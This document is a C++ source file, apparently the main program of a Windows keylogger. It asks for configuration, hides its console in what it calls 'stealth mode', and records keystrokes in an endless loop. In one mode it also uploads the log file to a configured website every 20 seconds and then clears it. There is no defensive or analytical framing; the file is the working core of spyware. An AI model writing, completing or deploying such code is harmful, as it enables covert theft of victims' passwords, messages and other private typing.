
#include <iostream>
#include "Keylogger.hpp"
#include "Request.hpp"
#include "Choice.hpp"
#include "Timer.hpp"
#include <chrono>
#include <thread>
#include <Windows.h>


int main()
{


    Choice choice;
    Request r;
    Timer t;
    //key.showConsole();
    //key.hideConsole();
    choice.askChoice();
    choice.setConfig();
    Keylogger key(choice.getFile());
    cout << "[+] Console passing stealth mode in 5secs... Enjoy :-)";
    Sleep(5000);
    key.hideConsole();
    t.start();
    while (true) {
        key.listenKeyboard();
        if (choice.getChoice() == 2) {
            
            if (t.stop() == 20) {
                //cout << "choice file: "+choice.getFile()+"\r\n";
                //cout << "keylogger file: " + key.getFile() + "\r\n";
                //cout << "website: " + choice.getSite() + "\r\n";
                //cout << "60 seconds elapsed" << endl;
                r.request(choice.getSite(), choice.getFile());
                key.clearFile();
                t.restart();

            }


        }

    }
}

